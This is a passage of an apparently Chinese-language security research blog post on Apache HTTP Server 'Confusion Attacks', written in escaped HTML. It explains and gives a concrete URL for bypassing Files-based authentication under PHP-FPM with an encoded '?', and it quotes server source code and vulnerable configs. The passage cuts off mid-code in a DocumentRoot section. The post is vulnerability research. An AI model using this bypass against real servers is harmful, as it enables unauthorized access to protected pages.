&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 當成網址這件事情其實很合理，因為原本 Proxy 的目的就是將請求「導向」到其它網址上，但安全往往就是單獨拿出來看沒問題，搭配在一起就出問題了！ 特別是當大多數模組預設將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 視為檔案系統路徑時，試想一下假設今天你使用基於檔案系統的存取控制模組，而現在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 又會把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 當成網址，這其中的不一致就可以導致存取控制或是認證被繞過！&lt;/p&gt;

&lt;p&gt;一個經典的例子是，網站管理員透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; 語法去對單一檔案加上限制，例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在預設安裝的 PHP-FPM 環境中，這種設定可以被直接繞過！ 順道一提這也是 Apache HTTP Server 中最常見到的認證方式！ 假設今天你瀏覽了這樣的網址：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;首先在這個網址的 HTTP 生命週期中，認證模組會將請求的檔案名稱與被保護的檔案進行比對，此時 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 欄位是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt; 理所當然與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt; 不符合，於是模組會認為當前請求不需要認證。 然而 PHP-FPM 的設定檔案又設定當收到結尾為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; 的請求時透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; 語法將請求轉交給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 重寫成以下網址並根據其中的協議呼叫子模組 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; 處理後續 FastCGI 協議的邏輯：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;由於這時後端在收到檔案名稱時已經是一個奇怪的格式了，PHP-FPM 只好對這個行為做特別處理，其中處理的邏輯如下：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到 PHP-FPM 先對檔案名稱正規化並對其中的問號 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; 進行分隔取出其中實際的檔案路徑並執行 (也就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;)。 所以基本上&lt;strong&gt;所有使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; 語法針對單一 PHP 檔案的認證或是存取控制設定在運行 PHP-FPM 的情境下都存在風險！&lt;/strong&gt; 😮&lt;/p&gt;

&lt;p&gt;從 GitHub 上可以找到非常多潛在有風險的設定，例如被限制在只有內網才能存取的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; 阻擋起來的 Adminer：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;被保護起來的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;防止直接存取的命令行工具：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過認證模組以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 間對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; 欄位理解的不一致，上面所有的例子都可以透過一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; 成功繞過！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;🔥 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;接下來要介紹的攻擊是基於 DocumentRoot 上的 Confusion Attack！ 首先你可以思考一下，對於下面這樣子的 Httpd 設定：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當瀏覽 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt; 時，到底實際 Httpd 會開啟哪個檔案？ 是根目錄下的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt; 還是 DocumentRoot 下的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt; 呢？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;答案是 —— &lt;strong&gt;兩個路徑都會存取&lt;/strong&gt;。 這也是我們的第二個 Confusion Attack，&lt;strong&gt;對於任意&lt;sup&gt;[1]&lt;/sup&gt;的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;，Httpd 總是會嘗試開啟帶有 DocumentRoot 的路徑以及沒有的路徑！&lt;/strong&gt; 有趣吧 😉&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] 位於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt; 內&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

